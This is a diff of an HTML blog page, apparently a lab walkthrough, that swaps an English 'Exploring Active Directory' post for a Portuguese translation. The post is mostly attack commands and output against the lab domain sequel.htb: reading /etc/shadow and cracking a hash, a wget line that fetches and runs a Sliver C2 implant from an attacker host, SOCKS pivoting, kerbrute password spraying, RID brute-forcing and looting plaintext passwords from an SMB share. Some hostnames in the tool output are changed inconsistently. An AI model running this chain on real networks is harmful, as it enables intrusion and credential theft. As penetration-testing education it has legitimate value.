@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-br">
 
 <head>
   <title>
-  Exploring Active Directory · pwnbuffer
+  Explorando o Active Directory · pwnbuffer
 </title>
   <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -19,14 +19,14 @@
 
 
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Exploring Active Directory">
+  <meta name="twitter:title" content="Explorando o Active Directory">
   <meta name="twitter:description" content="Active Directory">
 
 <meta property="og:url" content="https://pwnbuffer.org/posts/mount/adxpl/">
   <meta property="og:site_name" content="pwnbuffer">
-  <meta property="og:title" content="Exploring Active Directory">
+  <meta property="og:title" content="Explorando o Active Directory">
   <meta property="og:description" content="Active Directory">
-  <meta property="og:locale" content="en">
+  <meta property="og:locale" content="pt_br">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
     <meta property="article:published_time" content="2025-03-10T00:00:00+00:00">
@@ -114,19 +114,19 @@
         
           
             <li class="navigation-item">
-              <a class="navigation-link " href="https://pwnbuffer.org/about/">About</a>
+              <a class="navigation-link " href="https://pwnbuffer.org/posts/">Artigos</a>
             </li>
           
             <li class="navigation-item">
-              <a class="navigation-link " href="https://pwnbuffer.org/posts/">Posts</a>
+              <a class="navigation-link " href="https://pwnbuffer.org/categories/">Categorias</a>
             </li>
           
             <li class="navigation-item">
-              <a class="navigation-link " href="https://pwnbuffer.org/categories/">Categories</a>
+              <a class="navigation-link " href="https://pwnbuffer.org/members/">Membros</a>
             </li>
           
             <li class="navigation-item">
-              <a class="navigation-link " href="https://pwnbuffer.org/members/">Members</a>
+              <a class="navigation-link " href="https://pwnbuffer.org/about/">Sobre</a>
             </li>
           
             <li class="navigation-item">
@@ -146,7 +146,7 @@
                 
               
               <li class="navigation-item">
-                <a href="https://pwnbuffer.org/pt-br/posts/mount/adxpl/">🇧🇷</a>
+                <a href="https://pwnbuffer.org/en/posts/mount/adxpl/">🇺🇸</a>
               </li>
             
           
@@ -165,7 +165,7 @@
         <div class="post-title">
           <h1 class="title">
             <a class="title-link" href="https://pwnbuffer.org/posts/mount/adxpl/">
-              Exploring Active Directory
+              Explorando o Active Directory
             </a>
           </h1>
         </div>
@@ -174,12 +174,12 @@
             <span class="posted-on">
               <i class="fa-solid fa-calendar" aria-hidden="true"></i>
               <time datetime="2025-03-10T00:00:00Z">
-                March 10, 2025
+                março 10, 2025
               </time>
             </span>
             <span class="reading-time">
               <i class="fa-solid fa-clock" aria-hidden="true"></i>
-              15-minute read
+              15 minutos de leitura
             </span>
           </div>
           <div class="authors">
@@ -217,72 +217,72 @@
 
       <div class="post-content">
         
-        <h2 id="1-introduction">
-  1. introduction
-  <a class="heading-link" href="#1-introduction">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
+        <h2 id="1-introdução">
+  1. Introdução
+  <a class="heading-link" href="#1-introdu%c3%a7%c3%a3o">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
   </a>
 </h2>
-<p>Active Directory (<strong>AD</strong>) is a tool for network administrators, enabling the creation and management of domains, users and objects within a corporate network. Through AD, it is possible to connect all machines to a DC (<strong>Domain Controler</strong>) server.
-to a DC (<strong>Domain Controler</strong>) server which authenticates users using the kerberos protocol.</p>
-<p><em><strong>For example</strong></em>, an administrator can create a group of users within the corp.local domain and grant them specific privileges to access folders or internal systems. As the network grows, Active Directory makes it easier to organize large volumes of users and devices into logical groups, ensuring fine-grained control over permissions and access.</p>
-<p>Active Directory is organized as follows:</p>
+<p>O Active Directory (<strong>AD</strong>) é uma ferramenta para administradores de redes, permitindo a criação e gerenciamento de domínios, usuários e objetos dentro de uma rede corporativa. Por meio do AD, é possível conectar todas as maquinas
+em um servidor DC (<strong>Domain Controler</strong>) ele que autentifica os usuários por meio do protocolo kerberos.</p>
+<p><strong><em>Por exemplo</em></strong>, um administrador pode criar um grupo de usuários dentro do domínio corp.local e conceder a eles privilégios específicos para acessar pastas ou sistemas internos. À medida que a rede cresce, o Active Directory facilita a organização de grandes volumes de usuários e dispositivos em grupos lógicos, garantindo um controle refinado sobre permissões e acessos.</p>
+<p>O Active Directory é organizado da seguinte forma:</p>
 <ol>
-<li><strong>Domain</strong></li>
-<li><strong>Tree</strong></li>
-<li><strong>Forest</strong></li>
+<li><strong>Domínio</strong> (Domain)</li>
+<li><strong>Árvore</strong> (Tree)</li>
+<li><strong>Floresta</strong> (Forest)</li>
 </ol>
-<h2 id="21-domain">
-  2.1 Domain
-  <a class="heading-link" href="#21-domain">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
+<h2 id="21-domínio-domain">
+  2.1 Domínio (Domain)
+  <a class="heading-link" href="#21-dom%c3%adnio-domain">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
   </a>
 </h2>
-<p>A domain is a logical grouping of objects (users, computers, printers, etc.) that share the same database. All resources within a domain follow the rules established by the administrator.</p>
-<p><strong>Example</strong>: The <code>corp.local</code> domain can contain users such as <span style='color: yellow;'><em>joao@corp.local</em></span>, <span style='color: yellow;'><em>ana@corp.local</em></span> and devices such as <span style='color: yellow;'><em>servidor1.corp.local</em></span>.</p>
-<h2 id="22-tree">
-  2.2 Tree
-  <a class="heading-link" href="#22-tree">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
+<p>Um domínio é um agrupamento lógico de objetos (usuários, computadores, impressoras, etc.) que compartilham um mesmo banco de dados. Todos os recursos dentro de um domínio seguem as regras estabelecidas pelo administrador.</p>
+<p><strong><em>Exemplo:</em></strong> O domínio <code>corp.local</code> pode conter usuários como <span style='color: yellow;'><em>joao@corp.local</em></span>, <span style='color: yellow;'><em>ana@corp.local</em></span> e dispositivos como <span style='color: yellow;'><em>servidor1.corp.local</em></span>.</p>
+<h2 id="22-árvore-tree">
+  2.2 Árvore (Tree)
+  <a class="heading-link" href="#22-%c3%a1rvore-tree">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
   </a>
 </h2>
-<p>A tree is a collection of domains that share a continuous namespace. Within the tree, the domains have hierarchical and trust relationships with each other.</p>
-<p>Example: Within the corp.local tree, we can have secondary domains such as:</p>
+<p>Uma árvore é um conjunto de domínios que compartilham um espaço de nomes contínuo. Dentro da árvore, os domínios têm relações hierárquicas e de confiança entre si.</p>
+<p>Exemplo: Dentro da árvore corp.local, podemos ter domínios secundários como:</p>
 <ul>
-<li><em><strong>ti.corp.local</strong></em> (for the IT team)</li>
-<li><em><strong>finance.corp.local</strong></em> (for the finance department)</li>
-<li><em><strong>marketing.corp.local</strong></em> (for the marketing team)</li>
+<li><em><strong>ti.corp.local</strong></em> (para a equipe de TI)</li>
+<li><em><strong>financeiro.corp.local</strong></em> (para o departamento financeiro)</li>
+<li><em><strong>marketing.corp.local</strong></em> (para o time de marketing)</li>
 </ul>
-<h2 id="23-forest">
-  2.3 Forest
-  <a class="heading-link" href="#23-forest">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
+<h2 id="23-floresta-forest">
+  2.3 Floresta (Forest)
+  <a class="heading-link" href="#23-floresta-forest">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
   </a>
 </h2>
-<p>The forest represents the highest level of the <code>Active Directory</code> hierarchy. It is made up of multiple trees that share a common security scheme and configuration, but can have distinct and independent domains.</p>
-<p>Example: A multinational company may have a forest containing different trees:</p>
+<p>A floresta representa o nível mais alto da hierarquia do <code>Active Directory</code>. Ela é composta por múltiplas árvores que compartilham um esquema e uma configuração de segurança comuns, mas podem ter domínios distintos e independentes.</p>
+<p>Exemplo: Uma empresa multinacional pode conter uma floresta contendo diferentes árvores:</p>
 <ul>
-<li><em><strong>corp.local</strong></em> (for the head office)</li>
-<li><em><strong>europe.corp.local</strong></em> (for operations in Europe)</li>
-<li><em><strong>asia.corp.local</strong></em> (for operations in Asia)</li>
+<li><em><strong>corp.local</strong></em> (para a matriz)</li>
+<li><em><strong>europe.corp.local</strong></em> (para operações na Europa)</li>
+<li><em><strong>asia.corp.local</strong></em> (para operações na Ásia)</li>
 </ul>
 <p><img alt="ad" src="https://pwnbuffer.org/images/mount/ADxpl/img1.webp"></p>
-<h2 id="reconnaissance">
-  Reconnaissance
-  <a class="heading-link" href="#reconnaissance">
-    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
-    <span class="sr-only">Link to heading</span>
+<h1 id="reconhecimento">
+  Reconhecimento
+  <a class="heading-link" href="#reconhecimento">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link para o cabeçalho"></i>
+    <span class="sr-only">Link para o cabeçalho</span>
   </a>
-</h2>
-<p>in a scenario in which an attacker manages to compromise an entry point within the target network
-either by exploiting an open Internet service, obtaining vpn passwords or by phishing
-the internal reconnaissance process is initiated, the objective in question is to compromise the DC <strong>a.k.a</strong> <code>Domain Controler</code>
-and become <code>Domain Admin</code>.</p>
-<p>In our hypothetical scenario, the server “<em><strong>server-501</strong></em>” is used as a gateway to the network.</p>
+</h1>
+<p>Em um cenario no qual um atacante consegue comprometer um entry point dentro da rede alvo
+seja explorando algum serviço aberto para internet, obtendo senhas de vpn ou por enviando phising
+o processo de reconhecimento interno é iniciado, o objetivo em questão é comprometer o DC <strong>a.k.a</strong> <code>Domain Controler</code>
+e se tornar <code>Domain Admin</code>.</p>
+<p>No nosso cenario hipotetico o servidor &ldquo;<strong><em>server-501</em></strong>&rdquo; é usado como pivoting para a rede.</p>
 <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>[root@server-501]<span style="color:#999;font-style:italic"># lastlog</span>
 </span></span><span style="display:flex;"><span>root             tty1                 <span style="color:#3677a9">5</span>                             Fri Mar  <span style="color:#3677a9">7</span> 11:20:55 -0600 <span style="color:#3677a9">2025</span>
 </span></span><span style="display:flex;"><span>bin                                                                 **Never logged in**
@@ -302,9 +302,9 @@ and become <code>Domain Admin</code>.</p>
 </span></span><span style="display:flex;"><span>mysql                                                               **Never logged in**
 </span></span><span style="display:flex;"><span>nginx                                                               **Never logged in**
 </span></span><span style="display:flex;"><span>zabbix                                                              **Never logged in**
-</span></span></code></pre></div><p>user rose logged on to the machine in <strong>november 2024</strong>
-this information will be useful to us.</p>
-<p>Let&rsquo;s break the hash of user rose:</p>
+</span></span></code></pre></div><p>O usuário rose logou na maquina em <strong>Novembro de 2024</strong>
+essa informação vai ser util para nós.<br>
+Vamos quebrar a hash do usuário rose:</p>
 <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>[root@server-501]<span style="color:#999;font-style:italic"># cat /etc/passwd; echo &#34;\r\n&#34; ; cat /etc/shadow </span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>root@kali: /home/Documents
@@ -313,7 +313,7 @@ this information will be useful to us.</p>
 </span></span><span style="display:flex;"><span>KxEPkKe6R8su            (rose)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>// getting the routes 
+</span></span><span style="display:flex;"><span>// obtendo as rotas 
 </span></span><span style="display:flex;"><span>[root@server-501]<span style="color:#999;font-style:italic"># route                                                                                                                </span>
 </span></span><span style="display:flex;"><span>Kernel IP routing table
 </span></span><span style="display:flex;"><span>Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
@@ -321,7 +321,7 @@ this information will be useful to us.</p>
 </span></span><span style="display:flex;"><span>10.10.0.0       0.0.0.0         255.255.0.0     U     <span style="color:#3677a9">0</span>      <span style="color:#3677a9">0</span>        <span style="color:#3677a9">0</span> eth0
 </span></span><span style="display:flex;"><span>172.17.0.0      0.0.0.0         255.255.0.0     U     <span style="color:#3677a9">0</span>      <span style="color:#3677a9">0</span>        <span style="color:#3677a9">0</span> docker0
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>// listing
+</span></span><span style="display:flex;"><span>// enumerando
 </span></span><span style="display:flex;"><span>root@server-501# ./nmap -sn 10.10.0-255.1/24 | grep report | cut -d <span style="color:#ed9d13">&#39; &#39;</span> -f <span style="color:#3677a9">5</span> 
 </span></span><span style="display:flex;"><span>10.10.10.2
 </span></span><span style="display:flex;"><span>10.10.10.3
@@ -346,8 +346,8 @@ this information will be useful to us.</p>
 </span></span><span style="display:flex;"><span>10.10.11.51
 </span></span><span style="display:flex;"><span>10.10.14.1
 </span></span><span style="display:flex;"><span>10.10.14.227
-</span></span></code></pre></div><p>as you can see, the main network route is <code>10.10.0.0/16</code>
-before we start enumerating the services let&rsquo;s start our <a href="https://sliver.sh/"  class="external-link" target="_blank" rel="noopener"><code>C2 Sliver</code></a></p>
+</span></span></code></pre></div><p>Como podemos ver a rota principal da rede é <code>10.10.0.0/16</code>.<br>
+Antes de começarmos a enumerar os serviços vamos iniciar nosso <a href="https://sliver.sh/"  class="external-link" target="_blank" rel="noopener"><code>C2 Sliver</code></a></p>
 <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@kali: /home/kali/Documents
 </span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"># service sliver start                                                                                                              </span>
 </span></span><span style="display:flex;"><span> 
@@ -373,7 +373,7 @@ before we start enumerating the services let&rsquo;s start our <a href="https://
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>sliver &gt;  
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>// our goal here is to create a sliver payload <span style="color:#6ab825;font-weight:bold">for</span> the linux system to make pivoting easier
+</span></span><span style="display:flex;"><span>// nosso objetivo aqui é criar uma carga util sliver para o sistema linux para facilitar o pivoting
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>sliver &gt; mtls 
 </span></span><span style="display:flex;"><span>
@@ -393,30 +393,30 @@ before we start enumerating the services let&rsquo;s start our <a href="https://
 </span></span><span style="display:flex;"><span>[*] Build completed in 21s
 </span></span><span style="display:flex;"><span>[*] Implant saved to /tmp/CLASSIC_JUDGE
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>//downloading sliver payload to the machine
-</span></span><span style="display:flex;"><span>[root@server-501]<span style="color:#999;font-style:italic"># wget 10.10.14.227/CLASSIC_JUDGE -O /tmp/xfile ; chmod +x /tmp/xfile; /tmp/xfile &amp;  </span>
+</span></span><span style="display:flex;"><span>//baixando para a maquina
+</span></span><span style="display:flex;"><span>[root@server-501]<span style="color:#999;font-style:italic"># wget 10.10.14.227/CLASSIC_JUDGE -O /tmp/xfile ; chmod +x /tmp/xfile; /tmp/xfile &amp;   // carga util do sliver</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>// incoming connection
+</span></span><span style="display:flex;"><span>// conexão recebida
 </span></span><span style="display:flex;"><span>[*] Beacon a42ca296 CLASSIC_JUDGE - 10.10.14.227:32876 (server-501) - linux/amd64 - Sat, <span style="color:#3677a9">02</span> Mar <span style="color:#3677a9">2025</span> 10:25:13 EST
 </span></span><span style="display:flex;"><span>sliver &gt; use a42ca296
 </span></span><span style="display:flex;"><span>[*] Active beacon CLASSIC_JUDGE (a42ca296-7f35-4379-8d47-c42dba27ef64)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>// let<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>s start a socks proxy to communicate with the internal network
+</span></span><span style="display:flex;"><span>// vamos iniciar um socks proxy para nos comunicarmos com a rede interna
 </span></span><span style="display:flex;"><span>sliver (CLASSIC_JUDGE) &gt;socks5 start
 </span></span><span style="display:flex;"><span>[*] Started SOCKS5 127.0.0.1 <span style="color:#3677a9">1081</span>
 </span></span><span style="display:flex;"><span>In-band SOCKS proxies can be a little unstable depending on protocol
-</span></span></code></pre></div><p>perfect now we can start enumerating the <strong>smbs</strong> and <strong>windows</strong> on the network</p>
+</span></span></code></pre></div><p>perfeito agora podemos começar a enumerar os <strong>smbs</strong> e <strong>windows</strong> da rede</p>
 <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@kali: /home/kali/Documents
 </span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"># proxychains -q netexec smb hosts.txt                                                                                                                     </span>
 </span></span><span style="display:flex;"><span>SMB         10.10.11.45     <span style="color:#3677a9">445</span>    10.10.11.45      [*]  x64 (name:10.10.11.45) (domain:10.10.11.45) (signing:True) (SMBv1:False)
-</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             [*] Windows <span style="color:#3677a9">10</span> / Server <span style="color:#3677a9">2022</span> Build <span style="color:#3677a9">19282</span> x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
-</span></span><span style="display:flex;"><span>SMB         10.10.11.39     <span style="color:#3677a9">445</span>    SERVER-301               [*] Windows <span style="color:#3677a9">10</span> / Server <span style="color:#3677a9">2016</span> Build <span style="color:#3677a9">11825</span> x64 (name:SERVER-301) (domain:sequel.htb) (signing:True) (SMBv1:False)                                                                                                                               
-</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#3677a9">445</span>    SERVER-95             [*] Windows <span style="color:#3677a9">10</span> / Server <span style="color:#3677a9">2012</span> Build <span style="color:#3677a9">26201</span> x64 (name:SERVER-95) (domain:sequel.htb) (signing:True) (SMBv1:False)                                                                                                                              
-</span></span><span style="display:flex;"><span>SMB         10.10.11.24     <span style="color:#3677a9">445</span>    SERVER-451             [*] Windows Server <span style="color:#3677a9">2022</span> Build <span style="color:#3677a9">20348</span> x64 (name:SERVER-451) (domain:sequel.htb) (signing:True) (SMBv1:False)                                                                                                                                       
-</span></span><span style="display:flex;"><span>SMB         10.10.11.42     <span style="color:#3677a9">445</span>    SERVER-651               [*] Windows Server <span style="color:#3677a9">2022</span> Build <span style="color:#3677a9">20348</span> x64 (name:SERVER-651) (domain:sequel.htb) (signing:True) (SMBv1:False)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             [*] Windows <span style="color:#3677a9">10</span> / Server <span style="color:#3677a9">2022</span> Build <span style="color:#3677a9">19282</span> x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
+</span></span><span style="display:flex;"><span>SMB         10.10.11.39     <span style="color:#3677a9">445</span>    DC               [*] Windows <span style="color:#3677a9">10</span> / Server <span style="color:#3677a9">2016</span> Build <span style="color:#3677a9">11825</span> x64 (name:SERVER-301) (domain:sequel.htb) (signing:True) (SMBv1:False)                                                                                                                               
+</span></span><span style="display:flex;"><span>SMB         10.10.11.41     <span style="color:#3677a9">445</span>    DC01             [*] Windows <span style="color:#3677a9">10</span> / Server <span style="color:#3677a9">2012</span> Build <span style="color:#3677a9">26201</span> x64 (name:SERVER-95) (domain:sequel.htb) (signing:True) (SMBv1:False)                                                                                                                              
+</span></span><span style="display:flex;"><span>SMB         10.10.11.24     <span style="color:#3677a9">445</span>    DC01             [*] Windows Server <span style="color:#3677a9">2022</span> Build <span style="color:#3677a9">20348</span> x64 (name:SERVER-451) (domain:sequel.htb) (signing:True) (SMBv1:False)                                                                                                                                       
+</span></span><span style="display:flex;"><span>SMB         10.10.11.42     <span style="color:#3677a9">445</span>    DC               [*] Windows Server <span style="color:#3677a9">2022</span> Build <span style="color:#3677a9">20348</span> x64 (name:SERVER-651) (domain:sequel.htb) (signing:True) (SMBv1:False)
 </span></span><span style="display:flex;"><span>SMB         10.10.11.31     <span style="color:#3677a9">445</span>    DC01             [*] Windows <span style="color:#3677a9">10</span> / Server <span style="color:#3677a9">2019</span> Build <span style="color:#3677a9">17763</span> x64 (name:152) (domain:sequel.htb) (signing:True) (SMBv1:False)                                                                                                                            
 </span></span><span style="display:flex;"><span>SMB         10.10.10.3      <span style="color:#3677a9">445</span>    LAME             [*] Unix (name:LAME) (domain:sequel.htb) (signing:False) (SMBv1:True)
-</span></span></code></pre></div><p>we can see that the <strong>DomainControler</strong> ip is <code>10.10.11.51</code></p>
+</span></span></code></pre></div><p>Podemos ver que o ip do <strong>DomainControler</strong> é  <code>10.10.11.51</code></p>
 <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@server-501# ./nmap -v --open -sS -sV 10.10.11.51
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>PORT     STATE SERVICE       VERSION
@@ -433,8 +433,8 @@ before we start enumerating the services let&rsquo;s start our <a href="https://
 </span></span><span style="display:flex;"><span>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
 </span></span><span style="display:flex;"><span>3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
 </span></span><span style="display:flex;"><span>Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
-</span></span></code></pre></div><p>Remember <strong>Rose&rsquo;s password</strong> we took? Let&rsquo;s try to use her</p>
-<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@server-501# ./kerbrute userenum -d sequel.htb --dc 10.10.11.51 usuarios.txt                           
+</span></span></code></pre></div><p>lembra da <strong>senha da rose</strong> que pegamos? vamos tentar usar ela</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@server-501# ./kerbrute userenum -d sequel.htb --dc 10.10.11.51 usuários.txt                           
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    __             __               __     
 </span></span><span style="display:flex;"><span>   / /_____  _____/ /_  _______  __/ /____ 
@@ -451,9 +451,9 @@ before we start enumerating the services let&rsquo;s start our <a href="https://
 </span></span><span style="display:flex;"><span>2025/03/08 19:18:53 &gt;  [+] VALID USERNAME:       rose@sequel.htb
 </span></span><span style="display:flex;"><span>2025/03/08 19:18:53 &gt;  Done! Tested <span style="color:#3677a9">14</span> usernames (<span style="color:#3677a9">2</span> valid) in 0.449 seconds
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>// the rose user exists on the domain this is good <span style="color:#6ab825;font-weight:bold">for</span> us
+</span></span><span style="display:flex;"><span>// o usuário rose existe no domínio isso é bom para nós
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>root@server-501# ./kerbrute passwordspray -d sequel.htb --dc 10.10.11.51 usuarios.txt <span style="color:#ed9d13">&#34;KxEPkKe6R8su&#34;</span>
+</span></span><span style="display:flex;"><span>root@server-501# ./kerbrute passwordspray -d sequel.htb --dc 10.10.11.51 usuários.txt <span style="color:#ed9d13">&#34;KxEPkKe6R8su&#34;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    __             __               __     
 </span></span><span style="display:flex;"><span>   / /_____  _____/ /_  _______  __/ /____ 
@@ -469,15 +469,15 @@ before we start enumerating the services let&rsquo;s start our <a href="https://
 </span></span><span style="display:flex;"><span>2025/03/08 19:20:10 &gt;  [+] VALID LOGIN:  rose@sequel.htb:KxEPkKe6R8su
 </span></span><span style="display:flex;"><span>2025/03/08 19:20:10 &gt;  Done! Tested <span style="color:#3677a9">14</span> logins (<span style="color:#3677a9">1</span> successes) in 0.903 seconds
 </span></span><span style="display:flex;"><span> 
-</span></span><span style="display:flex;"><span>// and lucky <span style="color:#6ab825;font-weight:bold">for</span> us the password matches the linux credentials
-</span></span><span style="display:flex;"><span>// but we have no privileges 
+</span></span><span style="display:flex;"><span>// e para nossa sorte a senha bate com as credenciais <span style="color:#6ab825;font-weight:bold">do</span> linux
+</span></span><span style="display:flex;"><span>// porem não temos privilegios 
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>root@kali: /home/kali/Documents
 </span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"># proxychains -q netexec smb 10.10.11.51 -u rose -p KxEPkKe6R8su -d sequel.htb                                                                     [19:20:10]</span>
 </span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             [*] Windows <span style="color:#3677a9">10</span> / Server <span style="color:#3677a9">2019</span> Build <span style="color:#3677a9">17763</span> x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
 </span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             [+] sequel.htb<span style="color:#ed9d13">\r</span>ose:KxEPkKe6R8su 
-</span></span></code></pre></div><p>let&rsquo;s start our user enumeration</p>
+</span></span></code></pre></div><p>Vamos começar nossa enumeração de usuários</p>
 <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@kali: /home/kali/Documents
 </span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"># proxychains -q netexec smb 10.10.11.51 -u rose -p KxEPkKe6R8su -d sequel.htb --users --rid-brute --shares                                        [19:22:05]</span>
 </span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             [*] Windows <span style="color:#3677a9">10</span> / Server <span style="color:#3677a9">2019</span> Build <span style="color:#3677a9">17763</span> x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
@@ -540,8 +540,8 @@ before we start enumerating the services let&rsquo;s start our <a href="https://
 </span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             1605: SEQUEL<span style="color:#ed9d13">\R</span>eception Department (SidTypeGroup)
 </span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             1606: SEQUEL<span style="color:#ed9d13">\H</span>uman Resources Department (SidTypeGroup)
 </span></span><span style="display:flex;"><span>SMB         10.10.11.51     <span style="color:#3677a9">445</span>    DC01             1607: SEQUEL<span style="color:#ed9d13">\c</span>a_svc (SidTypeUser)
-</span></span></code></pre></div><p>we were able to discover other local and network users
-as well as an smb share containing some files</p>
+</span></span></code></pre></div><p>Conseguimos descobrir outros usuários locais e de rede,
+além de um compartilhamento smb contendo alguns arquivos.</p>
 <div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@kali: <span style="color:#999;font-style:italic"># proxychains -q impacket-smbclient sequel.htb/rose:&#39;KxEPkKe6R8su&#39;@10.10.11.51                                                                           </span>
 </span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 </span></span><span style="display:flex;"><span>
@@ -563,14 +563,15 @@ as well as an smb share containing some files</p>
 </span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"># get accounting_2024.xlsx</span>
 </span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"># get accounts.xlsx</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>//by downloading to our machine we can see the contents of the files: 
+</span></span><span style="display:flex;"><span>//baixando para nossa maquina podemos ver o conteudo dos arquivos: 
 </span></span><span style="display:flex;"><span>Angela	Martin	      angela@sequel.htb	angela	0fwz7Q4mSpurIt99
 </span></span><span style="display:flex;"><span>Oscar	  Martinez	    oscar@sequel.htb	oscar	  86LxLBMgEWaKUnBG
 </span></span><span style="display:flex;"><span>Kevin	  Malone	      kevin@sequel.htb	kevin	  Md9Wlq1E5bZnVDVo 
 </span></span><span style="display:flex;"><span>  -	      -	          sa@sequel.htb	     sa	    MSSQLP@ssw0rd!
-</span></span></code></pre></div><p>We got some user passwords, and one from the <code>mssql</code> service.
-Now we will do a domain enumeration to help us know <code>Domain</code> settings.</p>
-<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>//  LDAP
+</span></span></code></pre></div><p>Conseguimos algumas senhas de usuário, e uma do serviço <code>mssql</code>.
+Agora faremos uma enumeração de domínio para nos ajudar a saber
+configurações do <code>Domain</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>// via LDAP
